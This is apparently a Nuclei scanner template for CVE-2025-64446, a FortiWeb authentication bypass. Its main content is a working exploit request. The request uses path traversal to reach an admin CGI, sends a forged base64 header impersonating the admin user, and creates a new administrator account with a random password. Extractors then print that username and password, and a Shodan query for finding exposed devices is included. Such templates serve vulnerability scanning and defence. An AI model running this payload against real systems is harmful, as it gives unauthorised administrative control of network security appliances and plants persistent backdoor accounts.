http:
- extractors:
  - dsl:
    - '"USERNAME: "+ username'
    - '"PASSWORD: "+ password'
    type: dsl
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"results":'
    - '"can_clone":'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi HTTP/1.1\n\
    Host: {{Hostname}}\nCGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==\n\
    Content-Type: application/json\n\n{\n    \"data\": {\n        \"q_type\": 1,\n\
    \        \"name\": \"{{username}}\",\n        \"access-profile\": \"prof_admin\"\
    ,\n        \"access-profile_val\": \"0\",\n        \"last-name\": \"\",\n    \
    \    \"first-name\": \"\",\n        \"email-address\": \"\",\n        \"phone-number\"\
    : \"\",\n        \"mobile-number\": \"\",\n        \"hidden\": 0,\n        \"\
    comments\": \"\",\n        \"sz_dashboard\": -1,\n        \"type\": \"local-user\"\
    ,\n        \"type_val\": \"0\",\n        \"admin-usergrp_val\": \"0\",\n     \
    \   \"wildcard_val\": \"0\",\n        \"accprofile-override_val\": \"0\",\n  \
    \      \"sshkey\": \"\",\n        \"trusthostv4\": \"127.0.0.1/8\",\n        \"\
    trusthostv6\": \"::1/128\",\n        \"passwd-set-time\": 0,\n        \"history-password-pos\"\
    : 0,\n        \"history-password0\": \"\",\n        \"history-password1\": \"\"\
    ,\n        \"history-password2\": \"\",\n        \"history-password3\": \"\",\n\
    \        \"history-password4\": \"\",\n        \"history-password5\": \"\",\n\
    \        \"history-password6\": \"\",\n        \"history-password7\": \"\",\n\
    \        \"history-password8\": \"\",\n        \"history-password9\": \"\",\n\
    \        \"force-password-change\": \"disable\",\n        \"force-password-change_val\"\
    : \"0\",\n        \"password\": \"{{password}}\"\n    }\n}\n"
id: CVE-2025-64446
info:
  author: DhiyaneshDk,watchTowr,rapid7,defusedcyber
  classification:
    cpe: cpe:2.3:a:fortinet:fortiweb:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-64446
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-23
    epss-percentile: 0.99387
    epss-score: 0.86685
  description: 'A relative path traversal vulnerability in Fortinet FortiWeb 8.0.0
    through 8.0.1, FortiWeb 7.6.0 through 7.6.4, FortiWeb 7.4.0 through 7.4.9, FortiWeb
    7.2.0 through 7.2.11, FortiWeb 7.0.0 through 7.0.11 may allow an attacker to execute
    administrative commands on the system via crafted HTTP or HTTPS requests.

    '
  impact: 'Attackers can execute administrative commands remotely, potentially leading
    to full system compromise.

    '
  metadata:
    max-request: 1
    shodan-query: title:"FortiWeb - "
    verified: true
  name: FortiWeb - Authentication Bypass
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-64446
  - https://x.com/defusedcyber/status/1975242250373517373
  - https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass
  - https://github.com/rapid7/metasploit-framework/pull/20698/files
  remediation: 'Update to the latest FortiWeb version beyond 8.0.1.

    '
  severity: critical
  tags: cve,cve2025,vuln,fortiweb,fortigate,intrusive,auth-bypass,kev,vkev
variables:
  password: '{{to_lower(rand_text_alpha(8))}}'
  username: '{{to_lower(rand_text_alpha(8))}}'
